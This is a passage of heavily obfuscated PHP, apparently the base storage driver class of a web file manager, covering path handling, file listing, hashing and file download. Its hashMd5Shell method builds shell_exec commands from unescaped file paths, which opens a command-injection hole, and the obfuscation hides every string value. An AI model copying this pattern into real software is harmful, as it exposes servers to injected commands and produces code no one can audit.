|| !function_exists($ŒŞ¬¼Ö”[72])) { return $Ê›ó¬ï§; } static $Â­á­µ = array(); $°«Ğ ¾Û = $şÌ¯†‡ . $ŒŞ¬¼Ö”[73] . $®ŠâÔ™ . $ŒŞ¬¼Ö”[74] . $Ê›ó¬ï§; if (isset($Â­á­µ[$°«Ğ ¾Û])) { return $Â­á­µ[$°«Ğ ¾Û]; } if (function_exists($ŒŞ¬¼Ö”[75])) { $©íÀ³ÑÍ = @mb_convert_encoding($Ê›ó¬ï§, $®ŠâÔ™, $şÌ¯†‡); } else { $©íÀ³ÑÍ = @iconv($şÌ¯†‡, $®ŠâÔ™, $Ê›ó¬ï§); } $©íÀ³ÑÍ = $©íÀ³ÑÍ ? $©íÀ³ÑÍ : $Ê›ó¬ï§; if (strstr($©íÀ³ÑÍ, $ŒŞ¬¼Ö”[76])) { $©íÀ³ÑÍ = str_replace($ŒŞ¬¼Ö”[76], $ŒŞ¬¼Ö”[11], $©íÀ³ÑÍ); } $Â­á­µ[$şÌ¯†‡ . $ŒŞ¬¼Ö”[73] . $®ŠâÔ™ . $ŒŞ¬¼Ö”[74] . $Ê›ó¬ï§] = $©íÀ³ÑÍ; $Â­á­µ[$®ŠâÔ™ . $ŒŞ¬¼Ö”[73] . $şÌ¯†‡ . $ŒŞ¬¼Ö”[74] . $Ê›ó¬ï§] = $Ê›ó¬ï§; $Â­á­µ[$®ŠâÔ™ . $ŒŞ¬¼Ö”[73] . $şÌ¯†‡ . $ŒŞ¬¼Ö”[74] . $©íÀ³ÑÍ] = $Ê›ó¬ï§; $Â­á­µ[$şÌ¯†‡ . $ŒŞ¬¼Ö”[73] . $®ŠâÔ™ . $ŒŞ¬¼Ö”[74] . $©íÀ³ÑÍ] = $©íÀ³ÑÍ; return $©íÀ³ÑÍ; } public function getPathInner($èğïßøÇ) { $µ—îö = IO::init($èğïßøÇ); return $µ—îö->path; } public function getPathOuter($úæí¾«Î) { $’ğ™›®® =& $_SERVER[É¨™èà]; $ÎñùãØÎ = strlen(trim($this->pathBase, $’ğ™›®®[8])); $úæí¾«Î = substr(trim($úæí¾«Î, $’ğ™›®®[8]), $ÎñùãØÎ); return $this->pathDriver . $’ğ™›®®[8] . ltrim($úæí¾«Î, $’ğ™›®®[8]); } public function isParentOf($³ºÅİõÆ, $Æˆó‘ºä) { $Õ¼’†€¶ =& $_SERVER[É¨™èà]; $³ºÅİõÆ = rtrim(strtolower($³ºÅİõÆ), $Õ¼’†€¶[8]) . $Õ¼’†€¶[8]; $Æˆó‘ºä = rtrim(strtolower($Æˆó‘ºä), $Õ¼’†€¶[8]) . $Õ¼’†€¶[8]; $ÎÅÓ†²â = strpos($Æˆó‘ºä, $³ºÅİõÆ) === 0; return $ÎÅÓ†²â; } public function getType() { $¨ÅäÜµå =& $_SERVER[É¨™èà]; $µ”“ã¶ = str_replace($¨ÅäÜµå[77], $¨ÅäÜµå[12], get_class($this)); return strtolower($µ”“ã¶); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($È£Ö²İ‚, $îêéïö) { $ºÈéµÚ® =& $_SERVER[É¨™èà]; $Ó±ŒŸ´Ğ = rtrim($È£Ö²İ‚, $ºÈéµÚ®[8]) . $ºÈéµÚ®[8] . $îêéïö; $¹ÒÂøŒ« = $this->exist($Ó±ŒŸ´Ğ); return $¹ÒÂøŒ« ? $Ó±ŒŸ´Ğ : !1; } public function setModifyTime($¿íÃ¯§Ø, $ø’»á„Õ = '') { } public function renameObject($ä¼ƒè­, $ùÍ˜Œõ) { $ú¼ıçµ = $ùÍ˜Œõ; $ä¼ƒè­ = $this->getPathOuter($ä¼ƒè­); $ùÍ˜Œõ = $this->pathFather($ä¼ƒè­) . $ùÍ˜Œõ; $Ö—Æ·Éê = IO::copy($ä¼ƒè­, $this->pathFather($ä¼ƒè­), REPEAT_RENAME_FOLDER, $ú¼ıçµ); if ($Ö—Æ·Éê) { IO::remove($ä¼ƒè­); } return $Ö—Æ·Éê ? $ùÍ˜Œõ : !1; } public function tempFile($ˆôÀëì = '', $¥ä›Íí = '') { if (!$ˆôÀëì) { $ˆôÀëì = rand_string(15); } $‚ë×îØ³ = TEMP_FILES . rand_string(15) . $_SERVER[É¨™èà][8]; @mkdir($‚ë×îØ³, DEFAULT_PERRMISSIONS, !0); $Õúã¹ö— = $‚ë×îØ³ . $ˆôÀëì; @touch($Õúã¹ö—); if ($¥ä›Íí) { file_put_contents($Õúã¹ö—, $¥ä›Íí); } return $Õúã¹ö—; } public function tempFileRemve($ä˜ÉŠœ®) { @unlink($ä˜ÉŠœ®); @rmdir($this->pathFather($ä˜ÉŠœ®)); } public function mkfile($”şåöë, $¯··å‘¢ = '', $ÄÙ¡íÑË = REPEAT_RENAME) { } public function mkdir($ÆÈ‡ë, $û»ä±¼ã = REPEAT_SKIP) { } public function delFile($©ÃÊ›°Š) { } public function delFolder($ö¯ÇøÒà) { } public function copyFile($¤ÉóÃ‘, $¦Çæó©õ) { } public function moveFile($øÏŒÑ÷Ï, $Ì‹ûÑ¯) { } public function remove($¥±›ãù) { if ($this->isFile($¥±›ãù)) { return $this->delFile($¥±›ãù); } return $this->delFolder($¥±›ãù); } public function rename($•’ûŒüÑ, $ÕÈßÛÈ) { } public function exist($àïİ’Ü“) { } public function findByHash($Ñøóõ¾È = '', $³îİÁÎ = '') { return !1; } public function isFile($İ‚­é´´) { } public function isFolder($Ä¤ÇÆÊÖ) { } public function size($¶Í´Óóİ) { } public function info($¦™Éàš) { } public function infoSimple($±î‡©ê) { return $this->info($±î‡©ê); } public function infoAuth($¸¸şì€Ş) { return $this->info($¸¸şì€Ş); } public function infoFull($Û›·œ™) { return $this->info($Û›·œ™); } public function infoFullSimple($×äØ„ä) { return $this->info($×äØ„ä); } public function infoWithChildren($Õš”Ã´²) { $™µ‘õò€ =& $_SERVER[É¨™èà]; static $íÄÅÍà = array(); if (isset($íÄÅÍà[$Õš”Ã´²])) { return $íÄÅÍà[$Õš”Ã´²]; } $İ£÷ÛõÜ = $this->info($Õš”Ã´²); if ($İ£÷ÛõÜ && $İ£÷ÛõÜ[$™µ‘õò€[33]] == $™µ‘õò€[78]) { $¬“ƒ±©ı = array($™µ‘õò€[79] => 0, $™µ‘õò€[80] => 0, $™µ‘õò€[81] => 0); $this->infoChildren($Õš”Ã´², $¬“ƒ±©ı); $İ£÷ÛõÜ[$™µ‘õò€[79]] = $¬“ƒ±©ı[$™µ‘õò€[79]]; $İ£÷ÛõÜ[$™µ‘õò€[82]] = array($™µ‘õò€[83] => $¬“ƒ±©ı[$™µ‘õò€[80]], $™µ‘õò€[84] => $¬“ƒ±©ı[$™µ‘õò€[81]]); $íÄÅÍà[$Õš”Ã´²] = $İ£÷ÛõÜ; } return $İ£÷ÛõÜ; } public function listPath($òÆ˜¿ÚÇ, $ÆÚŸ”İÔ = false) { } public function has($ğÉ”²İø, $‡áÀì‡Š = false, $¿ùª ·é = false) { } public function canRead($…©­¦ò‘) { } public function canWrite($‘”Ïİâ×) { } public function getContent($‚ÚÌà¡Ş) { } public function setContent($ø½ß—ûš, $ëåõÛĞ = '') { } protected function infoChildren($Œß¶¸Ü•, &$öñÍÓ®“) { $š‘ƒ˜Ó… =& $_SERVER[É¨™èà]; check_abort_echo(); $¼â®¤è = $this->listPath($Œß¶¸Ü•, !0); $¼â®¤è = array_merge($¼â®¤è[$š‘ƒ˜Ó…[85]], $¼â®¤è[$š‘ƒ˜Ó…[86]]); foreach ($¼â®¤è as $¸£ğ çÂ) { if ($¸£ğ çÂ[$š‘ƒ˜Ó…[33]] == $š‘ƒ˜Ó…[78]) { $öñÍÓ®“[$š‘ƒ˜Ó…[81]]++; $ºÈÀ´‚ = $this->getPathInner($¸£ğ çÂ[$š‘ƒ˜Ó…[87]]); $this->infoChildren($ºÈÀ´‚, $öñÍÓ®“); } else { $öñÍÓ®“[$š‘ƒ˜Ó…[80]]++; $öñÍÓ®“[$š‘ƒ˜Ó…[79]] += $¸£ğ çÂ[$š‘ƒ˜Ó…[79]]; } } } public function fileSubstr($Ÿ¤æì€, $¢Ğ„Çõ‹, $ÖÚ°ëß) { } public function listAll($ê…§¹Çé) { } public function listAllMake($ì¥¶›ü, &$µ¿¢†…¯) { $ìçÎãÖ§ =& $_SERVER[É¨™èà]; check_abort_echo(); $¹ë…åÇú = $this->listPath($ì¥¶›ü, !0); if (!$¹ë…åÇú) { return; } $„í¼é÷Ü = array_merge($¹ë…åÇú[$ìçÎãÖ§[85]], $¹ë…åÇú[$ìçÎãÖ§[86]]); foreach ($„í¼é÷Ü as $¿ÚêÄ†) { $«“‚‹ÈÕ = $¿ÚêÄ†[$ìçÎãÖ§[33]] == $ìçÎãÖ§[78]; $ııª¤¥î = array($ìçÎãÖ§[87] => $¿ÚêÄ†[$ìçÎãÖ§[87]], $ìçÎãÖ§[78] => $«“‚‹ÈÕ); if (isset($¿ÚêÄ†[$ìçÎãÖ§[79]])) { $ııª¤¥î[$ìçÎãÖ§[79]] = $¿ÚêÄ†[$ìçÎãÖ§[79]]; } if (isset($¿ÚêÄ†[$ìçÎãÖ§[88]])) { $ııª¤¥î[$ìçÎãÖ§[88]] = $¿ÚêÄ†[$ìçÎãÖ§[88]]; } if (!$«“‚‹ÈÕ) { $µ¿¢†…¯[] = $ııª¤¥î; continue; } $µ¿¢†…¯[] = $ııª¤¥î; $Àé¸Óí® = $¿ÚêÄ†[$ìçÎãÖ§[87]]; $ µŞïî = $this->pathDriver; if (substr($¿ÚêÄ†[$ìçÎãÖ§[87]], 0, strlen($ µŞïî)) == $ µŞïî) { $Àé¸Óí® = substr($Àé¸Óí®, strlen($ µŞïî)); } $this->listAllMake($Àé¸Óí®, $µ¿¢†…¯); } } public function listAllSimple($ßÄ°¥öõ, $çÁ²ûÂŞ = false) { $øğì³¼¹ = $this->listAll($ßÄ°¥öõ); return $this->listAllSimpleMake($øğì³¼¹, $this->getPathOuter($ßÄ°¥öõ), $çÁ²ûÂŞ); } public function listAllSimpleMake($Æ»ï½ ´, $š¦Şø¨À, $á­Öà‚İ) { $·÷×¢‰ø =& $_SERVER[É¨™èà]; $â‡ÕÛ¿š = array(); $š¦Şø¨À = rtrim(get_path_father($š¦Şø¨À), $·÷×¢‰ø[8]) . $·÷×¢‰ø[8]; foreach ($Æ»ï½ ´ as $¿ÌÕ‡â) { $ñ°Š›èÏ = array($·÷×¢‰ø[87] => $¿ÌÕ‡â[$·÷×¢‰ø[87]], $·÷×¢‰ø[89] => $¿ÌÕ‡â[$·÷×¢‰ø[87]], $·÷×¢‰ø[78] => $¿ÌÕ‡â[$·÷×¢‰ø[78]]); if (isset($¿ÌÕ‡â[$·÷×¢‰ø[79]]) && !$¿ÌÕ‡â[$·÷×¢‰ø[78]]) { $ñ°Š›èÏ[$·÷×¢‰ø[79]] = $¿ÌÕ‡â[$·÷×¢‰ø[79]]; } if (isset($¿ÌÕ‡â[$·÷×¢‰ø[88]])) { $ñ°Š›èÏ[$·÷×¢‰ø[88]] = $¿ÌÕ‡â[$·÷×¢‰ø[88]]; } if (is_array($¿ÌÕ‡â[$·÷×¢‰ø[90]])) { $ñ°Š›èÏ[$·÷×¢‰ø[89]] = $¿ÌÕ‡â[$·÷×¢‰ø[90]][$·÷×¢‰ø[87]]; $ñ°Š›èÏ[$·÷×¢‰ø[79]] = $¿ÌÕ‡â[$·÷×¢‰ø[90]][$·÷×¢‰ø[79]]; $ñ°Š›èÏ[$·÷×¢‰ø[88]] = $¿ÌÕ‡â[$·÷×¢‰ø[90]][$·÷×¢‰ø[88]]; } else { if (substr($¿ÌÕ‡â[$·÷×¢‰ø[87]], 0, strlen($š¦Şø¨À)) == $š¦Şø¨À) { $ñ°Š›èÏ[$·÷×¢‰ø[87]] = substr($¿ÌÕ‡â[$·÷×¢‰ø[87]], strlen($š¦Şø¨À)); } } $ş¬”´Ë³ = $¿ÌÕ‡â[$·÷×¢‰ø[78]] ? $·÷×¢‰ø[8] : $·÷×¢‰ø[12]; $ñ°Š›èÏ[$·÷×¢‰ø[89]] = rtrim($ñ°Š›èÏ[$·÷×¢‰ø[89]], $·÷×¢‰ø[8]) . $ş¬”´Ë³; $ñ°Š›èÏ[$·÷×¢‰ø[87]] = $·÷×¢‰ø[8] . trim($ñ°Š›èÏ[$·÷×¢‰ø[87]], $·÷×¢‰ø[8]) . $ş¬”´Ë³; if (!$á­Öà‚İ) { $œª®˜ñ± = explode($·÷×¢‰ø[8], trim($ñ°Š›èÏ[$·÷×¢‰ø[87]], $·÷×¢‰ø[8])); $ñ°Š›èÏ[$·÷×¢‰ø[87]] = $·÷×¢‰ø[8] . implode($·÷×¢‰ø[8], array_slice($œª®˜ñ±, 1)) . $ş¬”´Ë³; } $â‡ÕÛ¿š[] = $ñ°Š›èÏ; } return array_sort_by($â‡ÕÛ¿š, $·÷×¢‰ø[87]); } public function upload($ñŞ×ä¾³, $¢›·×³ô, $İşå‚åÊ = false, $´Â¾•ä™ = REPEAT_REPLACE) { } public function uploadFileByID($Ûªš ‡µ, $¼ü‘ëãÒ, $œûíá›¼) { } public function uploadFileByPath($’È¼°ë, $¨ï²É»ï, $ã‰à®´ = array()) { } public function isUploadServer() { $¬şˆº¯ =& $_SERVER[É¨™èà]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¬şˆº¯[91]) { return !0; } return $GLOBALS[$¬şˆº¯[6]][$¬şˆº¯[92]][$¬şˆº¯[93]]; } public function isFileOutServer() { $Ÿş±«•ğ =& $_SERVER[É¨™èà]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ÿş±«•ğ[91]) { return !0; } return $GLOBALS[$Ÿş±«•ğ[6]][$Ÿş±«•ğ[92]][$Ÿş±«•ğ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ší¢ë) { $È„íÒÑ§ =& $_SERVER[É¨™èà]; if (!$this->isCdnHost()) { return $Ší¢ë; } return str_replace(trim(get_url_root($Ší¢ë), $È„íÒÑ§[8]), trim($this->cdnHost, $È„íÒÑ§[8]), $Ší¢ë); } public function uploadLink($’—âÈ®à, $ÁìÜäÌÂ = 0) { $úğá¬µÁ =& $_SERVER[É¨™èà]; if ($this->isUploadServer()) { return; } $…ğÂÊÙà = $this->getType(); if (!in_array($…ğÂÊÙà, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $»ºøö¸ä = 1024 * 1024 * 10; $Ù„È¢Ûß = $ÁìÜäÌÂ <= $»ºøö¸ä ? $úğá¬µÁ[95] : $úğá¬µÁ[96]; $Ø¤—üåµ = (!$ÁìÜäÌÂ ? 1 : ceil($ÁìÜäÌÂ / pow(1024, 3))) * 3600 * 4; $ÌÜŞ† = $this->{$Ù„È¢Ûß}($’—âÈ®à, $Ø¤—üåµ); if ($ÌÜŞ†) { $ÌÜŞ†[$úğá¬µÁ[97]] = $’—âÈ®à; $ÌÜŞ†[$úğá¬µÁ[98]] = $…ğÂÊÙà; } return $ÌÜŞ†; } public function uploadFormData($ãÓÁ®½È, $Û®°Ìâş = 3600) { } public function uploadMultiData($ËŸ¼÷–Ş, $Î—§²çı = 3600) { } public function multiUploadFormData($Û×ë™ùÍ, $˜èÅ¾¾í = 3600) { return $this->uploadMultiData($Û×ë™ùÍ, $˜èÅ¾¾í); } public function download($¾‡â¾¤, $ğ´Á®ÛË) { } public function ext($äè§Üªã) { $¹Ø¾‚½ê =& $_SERVER[É¨™èà]; if (strpos($äè§Üªã, $¹Ø¾‚½ê[8]) === -1) { $ŠÇÁÙç® = $äè§Üªã; } else { $ŠÇÁÙç® = $this->pathThis($äè§Üªã); } $´Ò¯¹„Î = $¹Ø¾‚½ê[12]; if (strstr($ŠÇÁÙç®, $¹Ø¾‚½ê[10])) { $´Ò¯¹„Î = substr($ŠÇÁÙç®, strrpos($ŠÇÁÙç®, $¹Ø¾‚½ê[10]) + 1); $´Ò¯¹„Î = strtolower($´Ò¯¹„Î); } if (strlen($´Ò¯¹„Î) > 3 && preg_match($¹Ø¾‚½ê[99], $´Ò¯¹„Î, $ßˆÕ»û€)) { $´Ò¯¹„Î = $¹Ø¾‚½ê[12]; } return $´Ò¯¹„Î; } public function pathThis($ÚÍ¸·°È) { $æ«„’Ë =& $_SERVER[É¨™èà]; $ÚÍ¸·°È = str_replace($æ«„’Ë[100], $æ«„’Ë[8], rtrim($ÚÍ¸·°È, $æ«„’Ë[8])); $øùæ®×÷ = strrpos($ÚÍ¸·°È, $æ«„’Ë[8]); if ($øùæ®×÷ === !1) { return $ÚÍ¸·°È; } return substr($ÚÍ¸·°È, $øùæ®×÷ + 1); } public function pathFather($Ê ¤·“©) { $ÒéÑûÔ =& $_SERVER[É¨™èà]; $Ê ¤·“© = str_replace($ÒéÑûÔ[100], $ÒéÑûÔ[8], rtrim($Ê ¤·“©, $ÒéÑûÔ[8])); $ø¦…¨ûŸ = strrpos($Ê ¤·“©, $ÒéÑûÔ[8]); if ($ø¦…¨ûŸ === !1) { return $ÒéÑûÔ[12]; } return substr($Ê ¤·“©, 0, $ø¦…¨ûŸ + 1); } public function hashSimple($Õ¹Ë­Àç) { $êŠé»†â =& $_SERVER[É¨™èà]; if (!$Õ¹Ë­Àç) { return md5($êŠé»†â[12]); } $—İ´òÙê = $this->size($Õ¹Ë­Àç); $©¨ÚË = 200; $áš¿ÅºÒ = 50; if ($—İ´òÙê <= $©¨ÚË * $áš¿ÅºÒ) { return $this->hashMd5($Õ¹Ë­Àç) . $—İ´òÙê; } $ä†…ıÛœ = intval($—İ´òÙê / $áš¿ÅºÒ); $üÓ©èÈ¸ = $êŠé»†â[12]; for ($ñæ­êÃË = 0; $ñæ­êÃË < $áš¿ÅºÒ; $ñæ­êÃË++) { $üÓ©èÈ¸ .= $this->fileSubstr($Õ¹Ë­Àç, $ä†…ıÛœ * $ñæ­êÃË, $©¨ÚË); } $üÓ©èÈ¸ .= $this->fileSubstr($Õ¹Ë­Àç, $—İ´òÙê - $©¨ÚË, $©¨ÚË); return md5($üÓ©èÈ¸) . $—İ´òÙê; } public static $md5Cache = array(); public function hashMd5($‹ŞöşåÜ) { if (!$‹ŞöşåÜ) { return md5($_SERVER[É¨™èà][12]); } $‹ŞöşåÜ = $this->iconvSystem($‹ŞöşåÜ); if (isset(self::$md5Cache[$‹ŞöşåÜ])) { return self::$md5Cache[$‹ŞöşåÜ]; } self::$md5Cache[$‹ŞöşåÜ] = $this->hashMd5Shell($‹ŞöşåÜ); if (!self::$md5Cache[$‹ŞöşåÜ]) { self::$md5Cache[$‹ŞöşåÜ] = @md5_file($‹ŞöşåÜ); } return self::$md5Cache[$‹ŞöşåÜ]; } private function hashMd5Shell($£ˆ¦Œ…) { $æî›€Ë =& $_SERVER[É¨™èà]; if (!$£ˆ¦Œ…) { return md5($æî›€Ë[12]); } if (!function_exists($æî›€Ë[101])) { return !1; } $´ìù¦È¸ = array($æî›€Ë[102], $æî›€Ë[103]); $ÇØ…˜âº = Cache::get($æî›€Ë[104]); if (!$ÇØ…˜âº) { $Ï÷ƒ©æÂ = BASIC_PATH . $æî›€Ë[105]; $¦¢Ü½ªã = md5_file($Ï÷ƒ©æÂ); $ÇØ…˜âº = $æî›€Ë[106]; foreach ($´ìù¦È¸ as $÷¤¥³­“) { $Î³÷¤» = shell_exec($÷¤¥³­“ . "\40\x22{$Ï÷ƒ©æÂ}\x22"); if ($Î³÷¤» && substr(trim($Î³÷¤»), 0, 32) == $¦¢Ü½ªã) { $ÇØ…˜âº = $÷¤¥³­“; break; } } Cache::set($æî›€Ë[104], $ÇØ…˜âº, 3600); } if ($ÇØ…˜âº == $æî›€Ë[106]) { return !1; } $Î³÷¤» = shell_exec($ÇØ…˜âº . "\40\x22{$£ˆ¦Œ…}\42"); $Î³÷¤» = str_replace($æî›€Ë[107], $æî›€Ë[12], $Î³÷¤»); return substr($Î³÷¤», 0, 32); } public function link($è­¯½˜) { return $è­¯½˜; } public function fileOut($éÙ‰‰‰õ, $‘ı¦ĞªÆ = false, $¦Ú­ÏÒ = false, $Á©Õ¹— = '') { $İöíä¸ =& $_SERVER[É¨™èà]; $this->cacheMethod(null, null); if (!$éÙ‰‰‰õ || !$this->exist($éÙ‰‰‰õ)) { show_json(LNG($İöíä¸[108]), !1, $¦Ú­ÏÒ); } $×Òığ¦ú = $this->getType() == $İöíä¸[109]; $é±Ş²ëë = $GLOBALS[$İöíä¸[6]][$İöíä¸[92]][$İöíä¸[110]][$İöíä¸[111]]; $ë”²Ãšà = (double) $GLOBALS[$İöíä¸[6]][$İöíä¸[92]][$İöíä¸[110]][$İöíä¸[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $½õ÷‰øò = $this->infoFull($éÙ‰‰‰õ); $º¬Ï¦üÅ = $½õ÷‰øò[$İöíä¸[79]]; $öæĞå¡’ = gmdate($İöíä¸[113], $½õ÷‰øò[$İöíä¸[88]]); $Ìƒ¹ãê = $¦Ú­ÏÒ ? $¦Ú­ÏÒ : $this->iconvApp($½õ÷‰øò[$İöíä¸[32]]); $Ì‚ª—„½ = 0; $Õãõæû½ = $º¬Ï¦üÅ - 1; $Ú¼èÉÆÎ = $this->ext($Ìƒ¹ãê); if (in_array($Ú¼èÉÆÎ, array($İöíä¸[114], $İöíä¸[115], $İöíä¸[116], $İöíä¸[117]))) { $Ú¼èÉÆÎ = $İöíä¸[118]; } if (in_array($Ú¼èÉÆÎ, array($İöíä¸[119]))) { $Ú¼èÉÆÎ = $İöíä¸[120]; } if (!$Á©Õ¹—) { $Á©Õ¹— = md5($öæĞå¡’ . $º¬Ï¦üÅ); } $Á©Õ¹— = $İöíä¸[121] . $Á©Õ¹— . $İöíä¸[121]; $Ÿ»Õ £® = get_file_mime($Ú¼èÉÆÎ); $òàŠœªŒ = !0; $òàŠœªŒ = isset($_GET[$İöíä¸[122]]) ? !1 : !0; if ($‘ı¦ĞªÆ === !1 && !mime_support($Ÿ»Õ £®)) { $Ÿ»Õ £® = $İöíä¸[123]; } header($İöíä¸[124]); header($İöíä¸[125] . $Ÿ»Õ £®); $‚™¬×ä  = rawurlencode($Ìƒ¹ãê); $‚™¬×ä  = $İöíä¸[121] . $‚™¬×ä  . $İöíä¸[126] . $‚™¬×ä ; if ($‘ı¦ĞªÆ) { header($İöíä¸[127]); header($İöíä¸[128] . $‚™¬×ä ); } else { if ($òàŠœªŒ) { header($İöíä¸[129] . $‚™¬×ä ); } } $ôĞïÊ¡ = 3600 * 24 * 30; header($İöíä¸[130]); header($İöíä¸[131]); header($İöíä¸[132] . $ôĞïÊ¡); header($İöíä¸[133] . gmdate($İöíä¸[113], time() + $ôĞïÊ¡) . $İöíä¸[134]); if (isset($_SERVER[$İöíä¸[135]]) && strtotime($_SERVER[$İöíä¸[135]]) == $½õ÷‰øò[$İöíä¸[88]]) { header($İöíä¸[136], !0, 304); die; } if (isset($_SERVER[$İöíä¸[137]]) && $_SERVER[$İöíä¸[137]] == $Á©Õ¹—) { header($İöíä¸[138] . $Á©Õ¹—, !0, 304); die; } header($İöíä¸[138] . $Á©Õ¹—); header($İöíä¸[139] . $öæĞå¡’ . $İöíä¸[134]); header($İöíä¸[140] . $Ìƒ¹ãê); header($İöíä¸[141]); header($İöíä¸[142] . $º¬Ï¦üÅ); header($İöíä¸[143]); Hook::trigger($İöíä¸[144], $éÙ‰‰‰õ, $º¬Ï¦üÅ, $Ìƒ¹ãê, $Ú¼èÉÆÎ); if (!$‘ı¦ĞªÆ && $Ú¼èÉÆÎ == $İöíä¸[145]) { if ($º¬Ï¦üÅ > 1024 * 1024 * 10) { die; } $ƒÕ»Ù© = $this->getContent($éÙ‰‰‰õ); $ƒÕ»Ù© = Html::clearSVG($ƒÕ»Ù©); header($İöíä¸[146] . strlen($ƒÕ»Ù©)); echo $ƒÕ»Ù©; die; } $¯¹Ùï¯˜ = strtolower($_SERVER[$İöíä¸[147]]); if ($×Òığ¦ú && $¯¹Ùï¯˜ && $é±Ş²ëë) { if (strstr($¯¹Ùï¯˜, $İöíä¸[148])) { header($İöíä¸[149] . $éÙ‰‰‰õ); } else { if (strstr($¯¹Ùï¯˜, $İöíä¸[150])) { header($İöíä¸[151] . $éÙ‰‰‰õ); } else { if (strstr($¯¹Ùï¯˜, $İöíä¸[152])) { header($İöíä¸[153] . $éÙ‰‰‰õ); } } } if ($ë”²Ãšà) { header($İöíä¸[154] . $ë”²Ãšà); } return; } if (isset($_SERVER[$İöíä¸[155]])) { if (preg_match($İöíä¸[156], $_SERVER[$İöíä¸[155]], $‰¦¬ƒÛ‡)) { $Ì‚ª—„½ = intval($‰¦¬ƒÛ‡[1]); $Ì‚ª—„½ = $Ì‚ª—„½ <= 0 ? 0 : ($Ì‚ª—„½ >= $Õãõæû½ ? $Õãõæû½ : $Ì‚ª—„½); if (!empty($‰¦¬ƒÛ‡[2])) { $‹š©¡‘¡ = intval($‰¦¬ƒÛ‡[2]); $Õãõæû½ = $‹š©¡‘¡ < $Ì‚ª—„½ ? $Ì‚ª—„½ : ($‹š©¡‘¡ >= $Õãõæû½ ? $Õãõæû½ : $‹š©¡‘¡); } } header($İöíä¸[157]); header("\x43\x6f\x6e\x74\x65\156\164\55\122\x61\156\x67\145\x3a\40\142\x79\164\145\163\x20{$Ì‚ª—„½}\x2d{$Õãõæû½}\x2f" . $º¬Ï¦üÅ); } else { header($İöíä¸[158]); } header($İöíä¸[159]); header($İöíä¸[160]); $²¹Òä€ = !0; if ($_SERVER[$İöíä¸[161]] == $İöíä¸[162] && $º¬Ï¦üÅ > 1204 * 1024 * 1024 * 2) { $²¹Òä€ = !1; } if ($²¹Òä€) { header($İöíä¸[163] . ($Õãõæû½ - $Ì‚ª—„½ + 1)); } if ($_SERVER[$İöíä¸[164]] == $İöíä¸[165]) { return; } $‰–ÜÇ‹ = array($İöíä¸[166] => !1, $İöíä¸[167] => $Ì‚ª—„½, $İöíä¸[168] => $Õãõæû½, $İöíä¸[169] => $Ú¼èÉÆÎ, $İöíä¸[170] => $½õ÷‰øò, $İöíä¸[171] => $İöíä¸[12], $İöíä¸[172] => 0); $‰–ÜÇ‹ = Hook::filter($İöíä¸[173], $‰–ÜÇ‹); $“Ğ¾¼¿´ = 1024 * 300; $æŸ¶Ìå = 0; if ($ë”²Ãšà) { $æŸ¶Ìå = intval(1000 * 1000 * ($“Ğ¾¼¿´ / $ë”²Ãšà)); } while ($Ì‚ª—„½ <= $Õãõæû½) { $–ŸÛ…êì = timeFloat(); check_abort(); $·ÔˆÁ¹Ç = $Õãõæû½ - $Ì‚ª—„½ + 1; if ($·ÔˆÁ¹Ç <= $“Ğ¾¼¿´) { $“Ğ¾¼¿´ = $·ÔˆÁ¹Ç; } $ƒÕ»Ù© = $this->fileSubstr($éÙ‰‰‰õ, $Ì‚ª—„½, $“Ğ¾¼¿´); if ($‰–ÜÇ‹[$İöíä¸[166]]) { $‰–ÜÇ‹[$İöíä¸[171]] = $ƒÕ»Ù©; $‰–ÜÇ‹[$İöíä¸[172]] = $Ì‚ª—„½; $‰–ÜÇ‹ = Hook::filter($İöíä¸[174], $‰–ÜÇ‹); $ƒÕ»Ù© = $‰–ÜÇ‹[$İöíä¸[171]]; } echo $ƒÕ»Ù©; $Ì‚ª—„½ += $“Ğ¾¼¿´; if ($“Ğ¾¼¿´ == $·ÔˆÁ¹Ç) { $Ì‚ª—„½ = $Õãõæû½ + 1; } if ($æŸ¶Ìå) { $úñ¾…Ô = intval(1000 * 1000 * (timeFloat() - $–ŸÛ…êì)); $áØÍ‹Â = $æŸ¶Ìå - $úñ¾…Ô; if ($áØÍ‹Â > 5) { usleep($áØÍ‹Â); } } } } public function fileOutServer($ÊÆĞ´°, $¼ÍŠ—öË = false, $²’×Â = false, $¼ë¡æê = '') { $this->fileOut($ÊÆĞ´°, $¼ÍŠ—öË, $²’×Â, $¼ë¡æê); } public function fileOutLink($±¶ÌÂ¾) { header($_SERVER[É¨™èà][175] . $±¶ÌÂ¾); die; } public function cacheMethod($¸´×Ã¶, $æµÈ¬ı”, $¸ÇÆæú = null) { $äŞ‘“ÁÏ =& $_SERVER[É¨™èà]; static $˜şµı“• = array(); $»Ûğ¡ëø = $æµÈ¬ı” ? ltrim($this->getPathOuter($æµÈ¬ı”), $äŞ‘“ÁÏ[8]) : $äŞ‘“ÁÏ[12]; $¶İ‚µø = $äŞ‘“ÁÏ[176] . $¸´×Ã¶ . $äŞ‘“ÁÏ[177] . rtrim($»Ûğ¡ëø, $äŞ‘“ÁÏ[8]); if (is_null($¸´×Ã¶)) { $˜şµı“• = array(); return; } if (is_null($æµÈ¬ı”)) { foreach ($˜şµı“• as $¶İ‚µø => $›ĞÏÜö) { if (!strstr($¶İ‚µø, $äŞ‘“ÁÏ[176] . $¸´×Ã¶ . $äŞ‘“ÁÏ[178])) { continue; } unset($˜şµı“•[$¶İ‚µø]); } return; } if ($¸ÇÆæú === $äŞ‘“ÁÏ[179]) { unset($˜şµı“•[$¶İ‚µø]); return; } if (!is_null($¸ÇÆæú)) { $˜şµı“•[$¶İ‚µø] = $¸ÇÆæú; return; } $¶ßğ×ª = isset($˜şµı“•[$¶İ‚µø]) ? $˜şµı“•[$¶İ‚µø] : null; if (!is_null($¶ßğ×ª)) { return $¶ßğ×ª; } $¶ßğ×ª = $this->{$¸´×Ã¶}($æµÈ¬ı”); $˜şµı“•[$¶İ‚µø] = $¶ßğ×ª; return $¶ßğ×ª; } public function cacheMethodInfoSet($Ö¬ÔÓÄ¦, $öû´”â, $”¿²Ì¨§ = false) { $ˆ°÷—„î =& $_SERVER[É¨™èà]; if ($this->listItemCache === !1) { return; 